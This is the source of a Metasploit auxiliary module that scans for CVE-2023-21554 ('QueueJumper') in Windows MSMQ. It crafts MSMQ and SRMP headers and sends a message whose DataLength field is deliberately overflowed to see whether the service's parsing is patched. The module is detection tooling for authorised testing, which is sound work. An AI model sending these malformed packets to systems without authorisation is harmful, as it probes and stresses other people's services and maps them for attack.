##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'bindata'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CVE-2023-21554 - QueueJumper - MSMQ RCE Check',
        'Description' => %q{
          This module checks the provided hosts for the CVE-2023-21554 vulnerability by sending
          a MSMQ message with an altered DataLength field within the SRMPEnvelopeHeader that
          overflows the given buffer. On patched systems, the error is caught and no response
          is sent back. On vulnerable systems, the integer wraps around and depending on the length
          could cause an out-of-bounds write. In the context of this module a response is sent back,
          which indicates that the system is vulnerable.
        },
        'Author' => [
          'Wayne Low', # Vulnerability discovery
          'Haifei Li', # Vulnerability discovery
          'Bastian Kanbach <bastian.kanbach@securesystems.de>' # Metasploit Module, @__bka__
        ],
        'References' => [
          [ 'CVE', '2023-21554' ],
          [ 'URL', 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21554' ],
          [ 'URL', 'https://securityintelligence.com/posts/msmq-queuejumper-rce-vulnerability-technical-analysis/' ]
        ],
        'DisclosureDate' => '2023-04-11',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION],
          'AKA' => ['QueueJumper']
        }
      )
    )
    register_options([
      Opt::RPORT(1801)
    ])
  end

  # Preparing message struct according to https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/f9e71595-339a-4cc4-8341-371e0a4cb232

  class BaseHeader < BinData::Record
    # BaseHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmq/058cdeb4-7a3c-405b-989c-d32b9d6bddae)
    #
    # Simple header containing a static signature, packet size, some flags and some sort of timeout value for the message to arrive
    #

    endian :big

    uint8 :version_number
    uint8 :reserved
    uint16 :flags
    uint32 :signature
    uint32le :packet_size
    uint32le :time_to_reach_queue
  end

  class UserHeader < BinData::Record
    # UserHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmq/056b43bc-2466-4342-8504-1630310d5965)
    #
    # The UserHeader is an essential header that defines the destination, message id,
    # source, sent time and expiration time
    #

    endian :big

    string :source_queue_manager, length: 16
    string :queue_manager_address, length: 16
    uint32le :time_to_be_received
    uint32le :sent_time
    uint32le :message_id
    uint32 :flags
    uint16le :destination_queue_length
    string :destination_queue
    string :padding
  end

  class MessagePropertiesHeader < BinData::Record
    # MessagePropertiesHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmq/b219bdf4-1bf6-4688-94d8-25fdba45e5ec)
    #
    # This header contains meta information about the message like its label,
    # message size and whether encryption is used.
    #

    endian :big

    uint8  :flags
    uint8  :label_length
    uint16 :message_class
    string :correlation_id, length: 20
    uint32 :body_type
    uint32 :application_tag
    uint32 :message_size
    uint32 :allocation_body_size
    uint32 :privacy_level
    uint32 :hash_algorithm
    uint32 :encryption_algorithm
    uint32 :extension_size
    string :label
  end

  class SRMPEnvelopeHeader < BinData::Record
    # SRMPEnvelopeHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/062b8317-2ade-4b1c-804d-1674b2fdcad3)
    #
    # This header contains information about the SOAP envelope of the message.
    # It includes information about destination queue, label, message and sent
    # or expiration dates.
    # The Data field contains a SRMP Message Structure (https://learn.microsoft.com/en-us/openspecs/windows_protocols/mc-mqsrm/38cfc717-c703-46aa-a145-34f60b79399b)
    #

    endian :big

    uint16  :header_id
    uint16  :reserved
    uint32le :data_length
    string :data
    string :padding
  end

  class CompoundMessageHeader < BinData::Record
    # CompoundMessageHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/ecf70c09-d312-4afc-9e2c-f61a5c827f47)
    #
    # This header contains information about the SRMP compound message.
    # This is basically a HTTP message containing HTTP headers and a SOAP
    # body that defines parameters like the message destination, sent date,
    # label and some more.
    #

    endian :big

    uint16le :header_id
    uint16 :reserved
    uint32le :http_body_size
    uint32le :msg_body_size
    uint32le :msg_body_offset
    string :data
  end

  class ExtensionHeader < BinData::Record
    #  ExtensionHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/baf230bf-7f15-4d03-bd1d-f8276608a955)
    #
    #  Header detailing if any further headers are present. In this case
    #  no further headers were appended.
    #

    endian :big

    uint32le :header_size
    uint32le :remaining_headers_size
    uint8 :flags
    string :reserved, length: 3
  end

  def send_message(msg)
    connect
    sock.put(msg)
    response = sock.timed_read(1024)
    disconnect
    return response
  end

  def run_host(ip)
    base_header = BaseHeader.new

    # Version number is always 0x10
    base_header.version_number = 16

    base_header.reserved = 0

    # Flags: PR=3 (Message Priority)
    base_header.flags = 768

    # Signature is static and always set to 'LIOR'
    base_header.signature = 0x4C494F52

    # TimeToReachQueue set to 'infinite' (0xFFFFFFFF)
    base_header.time_to_reach_queue = 4294967295

    user_header = UserHeader.new

    # SourceQueueManager is set to a null UUID, since SRMP Messages use the SOAP Headers for this
    user_header.source_queue_manager = "\x00" * 16

    # QueueManagerAddress is set to a null UUID, since SRMP Messages use the SOAP Headers for this
    user_header.queue_manager_address = "\x00" * 16

    user_header.time_to_be_received = 0

    # SentTime is set to an arbitrary value. For this purpose it doesn't matter if it's in the past
    user_header.sent_time = 1690217059

    user_header.message_id = 1

    # Flags: RC=1, DQ=7 (Direct Format Type), F=1 (MessagePropertiesHeader present), J=1 (HTTP used)
    user_header.flags = 18620418

    # An arbitrary ip address and queue name was choosen to send the message.
    # Usually this need to match an existing IP address and queue name, however
    # for this Proof-of-Concept it doesn't matter what values are used.
    user_header.destination_queue = "http://192.168.10.100/msmq/private$/queuejumper\x00".encode('utf-16le')

    user_header.destination_queue_length = user_header.destination_queue.length
    user_header.padding = ''
    user_header_padding_required = (4 - (user_header.to_binary_s.length % 4)) % 4
    user_header.padding = "\x00" * user_header_padding_required

    message_properties_header = MessagePropertiesHeader.new
    message_properties_header.flags = 0
    message_properties_header.message_class = 0
    message_properties_header.correlation_id = "\x00" * 20
    message_properties_header.body_type = 0
    message_properties_header.application_tag = 0

    # Usually this field contains the size of the message. In SRMP messages this is handles within the SOAP headers
    message_properties_header.message_size = 0

    message_properties_header.allocation_body_size = 0
    message_properties_header.privacy_level = 0
    message_properties_header.hash_algorithm = 0
    message_properties_header.encryption_algorithm = 0
    message_properties_header.extension_size = 0

    # Label of the message was set to the arbitrary value 'poc'
    message_properties_header.label = "poc\x00".encode('utf-16le')

    message_properties_header.label_length = message_properties_header.label.length / 2

    srmp_envelope_header = SRMPEnvelopeHeader.new
    srmp_envelope_header.header_id = 0
    srmp_envelope_header.reserved = 0

    # The payload within the SRMPEnvelopeHeader structure is a SOAP request that defines message label, destination queue
    # and expiry and sent dates.
    # Usually the destination information need to match the IP address and queue name, however
    # for this Proof-of-Concept it doesn't matter what values are used.
    srmp_envelope_header.data = <<~EOF.chomp
      <se:Envelope xmlns:se="http://schemas.xmlsoap.org/soap/envelope/" \r
      xmlns="http://schemas.xmlsoap.org/srmp/">\r
      <se:Header>\r
       <path xmlns="http://schemas.xmlsoap.org/rp/" se:mustUnderstand="1">\r
         <action>MSMQ:poc</action>\r
         <to>http://192.168.10.100/msmq/private$/queuejumper</to>\r
         <id>uuid:1@00000000-0000-0000-0000-000000000000</id>\r
       </path>\r
       <properties se:mustUnderstand="1">\r
         <expiresAt>20600609T164419</expiresAt>\r
         <sentAt>20230724T164419</sentAt>\r
       </properties>\r
      </se:Header>\r
      <se:Body></se:Body>\r
      </se:Envelope>\r\n\r\n\x00
    EOF

    srmp_envelope_header.data = srmp_envelope_header.data.encode('utf-16le')
    srmp_envelope_header.data_length = srmp_envelope_header.data.length / 2
    srmp_envelope_header_padding_required = (4 - (srmp_envelope_header.to_binary_s.length % 4)) % 4
    srmp_envelope_header.padding = "\x00" * srmp_envelope_header_padding_required

    compound_message_header = CompoundMessageHeader.new

    # HeaderId is set to an arbitrary value
    compound_message_header.header_id = 500

    compound_message_header.reserved = 0

    # MsgBodySize denotes the size of the actual message
    compound_message_header.msg_body_size = 7

    # MsgBodyOffset is the offset of the actual message within the CompoundMessageHeader payload
    compound_message_header.msg_body_offset = 995

    # The data field within the CompoundMessageHeader structure contains a HTTP-POST request that is used to submit the message
    # to MSMQ. It contains the destination host, the SOAP envelope from SRMPEnvelopeHeader, sent and expiry dates. The destination
    # addresses and queue names don't need to match for this proof-of-concept to work. With incorrect information the message will
    # never reach the destination, however parsing of the structure and triggering the vulnerable code sequence happens before anyway.
    compound_message_header.data = <<~EOF.chomp
      POST /msmq HTTP/1.1\r
      Content-Length: 816\r
      Content-Type: multipart/related; boundary="MSMQ - SOAP boundary, 53287"; type=text/xml\r
      Host: 192.168.10.100\r
      SOAPAction: "MSMQMessage"\r
      Proxy-Accept: NonInteractiveClient\r
      \r
      --MSMQ - SOAP boundary, 53287\r
      Content-Type: text/xml; charset=UTF-8\r
      Content-Length: 606\r
      \r
      <se:Envelope xmlns:se="http://schemas.xmlsoap.org/soap/envelope/" \r
      xmlns="http://schemas.xmlsoap.org/srmp/">\r
      <se:Header>\r
       <path xmlns="http://schemas.xmlsoap.org/rp/" se:mustUnderstand="1">\r
         <action>MSMQ:poc</action>\r
         <to>http://192.168.10.100/msmq/private$/queuejumper</to>\r
         <id>uuid:1@00000000-0000-0000-0000-000000000000</id>\r
       </path>\r
       <properties se:mustUnderstand="1">\r
         <expiresAt>20600609T164419</expiresAt>\r
         <sentAt>20230724T164419</sentAt>\r
       </properties>\r
      </se:Header>\r
      <se:Body></se:Body>\r
      </se:Envelope>\r
      \r
      --MSMQ - SOAP boundary, 53287\r
      Content-Type: application/octet-stream\r
      Content-Length: 7\r
      Content-Id: body@ff3af301-3196-497a-a918-72147c871a13\r
      \r
      Message\r
      --MSMQ - SOAP boundary, 53287--\x00
    EOF
    compound_message_header.http_body_size = compound_message_header.data.length

    extension_header = ExtensionHeader.new

    # Extension header will be empty in this case. The length is set to the minimal value of 12.
    extension_header.header_size = 12

    extension_header.remaining_headers_size = 0
    extension_header.flags = 0
    extension_header.reserved = "\x00" * 3

    # Total packet size within the BaseHeader is calculated, now that all message parts were instantiated
    base_header.packet_size = base_header.to_binary_s.length + user_header.to_binary_s.length + message_properties_header.to_binary_s.length + srmp_envelope_header.to_binary_s.length + compound_message_header.to_binary_s.length + extension_header.to_binary_s.length

    # A normal message is sent to the server. This should yield a result for both, vulnerable and patched MSMQ instances
    response = send_message(base_header.to_binary_s + user_header.to_binary_s + message_properties_header.to_binary_s + srmp_envelope_header.to_binary_s + compound_message_header.to_binary_s + extension_header.to_binary_s)

    if !response
      print_error('No response received due to a timeout')
      return
    end

    if response.include?('LIOR')
      # Response from server contains the static signature value 'LIOR'. Presence of MSMQ is confirmed
      print_status('MSMQ detected. Checking for CVE-2023-21554')
    else
      print_error('Service does not look like MSMQ')
      return
    end

    # This statement increases the DataLength field within the SRMPEnvelopeHeader by 0x80000000. This will cause
    # an integer overflow, that overflows the 4 integer bytes. By adding this value the least significant 4 bytes will
    # remain the same, to ensure that a vulnerable MSMQ instance doesn't try to access invalid memory. This means that
    # vulnerable instances are expected to sent a normal response, like for the first, unmodified packet.
    #
    # Patched instances will detect the overflow, throw an exception and stop processing the message. No response is expected.
    srmp_envelope_header.data_length = srmp_envelope_header.data_length + 2147483648

    response = send_message(base_header.to_binary_s + user_header.to_binary_s + message_properties_header.to_binary_s + srmp_envelope_header.to_binary_s + compound_message_header.to_binary_s + extension_header.to_binary_s)

    if response.nil?
      print_error('No response received, MSMQ seems to be patched')
      return
    end

    if response.include?('LIOR')
      print_good('MSMQ vulnerable to CVE-2023-21554 - QueueJumper!')

      # Add Report
      report_vuln(
        host: ip,
        port: rport,
        proto: 'tcp',
        name: name,
        info: 'Missing Microsoft Windows patch for CVE-2023-21554',
        refs: references
      )

    else
      print_error('Unknown response detected upon sending a malformed message. MSMQ might be vulnerable, but the behaviour is unusual')
    end
  rescue ::Rex::ConnectionError
    print_error('Unable to connect to the service')
  rescue ::Errno::ECONNRESET
    print_error('Connection reset by service')
  rescue ::Errno::EPIPE
    print_error('pipe error')
  rescue Timeout::Error
    print_error('Timeout after waiting for service to respond')
  rescue StandardError => e
    print_error(e)
  end
end
